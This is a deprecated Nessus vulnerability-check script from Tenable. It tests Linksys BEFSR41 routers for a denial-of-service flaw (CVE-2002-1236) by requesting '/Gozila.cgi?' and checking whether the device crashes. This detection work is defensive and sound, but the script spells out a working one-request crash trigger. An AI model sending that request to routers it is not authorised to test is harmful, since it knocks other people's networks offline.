# @DEPRECATED@
#
# Disabled because it's buggy.
exit(0);

#
# (C) Tenable Network Security, Inc.
#
# References:
#
# From: "David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Thu, 31 Oct 2002 21:09:10 -0500
# Subject: iDEFENSE Security Advisory 10.31.02a: Denial of Service Vulnerability in Linksys BEFSR41 EtherFast Cable/DSL Router
# 
# http://www.linksys.com/products/product.asp?prid=20&grid=23
#


if(description)
{
  script_id(11773);
  script_cve_id("CVE-2002-1236");
  script_bugtraq_id(6086); 
  script_xref(name:"OSVDB", value:"6740");
  script_version ("$Revision: 1.11 $");
 
  script_name(english:"Linksys BEF Series Routers Gozila.cgi Multiple Parameter Remote DoS");
 
  desc["english"] = "
The Linksys BEFSR41 EtherFast Cable/DSL Router crashes
if somebody accesses the Gozila CGI without argument on
the web administration interface.

Solution : upgrade your router firmware to 1.42.7.

Risk factor : Medium";


  script_description(english:desc["english"]);    
  summary["english"] = "Request for Gozila.cgi? crashes the Linksys router"; 
  script_summary(english:summary["english"]);
  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

  script_family(english:"CISCO");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Settings/ParanoidReport");
  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

start_denial();

soc = open_sock_tcp(port);
if (! soc) exit(0);
# Maybe we should look into the misc CGI directories?
r = http_get(port: port, item: "/Gozila.cgi?");
send(socket: soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

alive = end_denial();
if (! alive) security_warning(port);
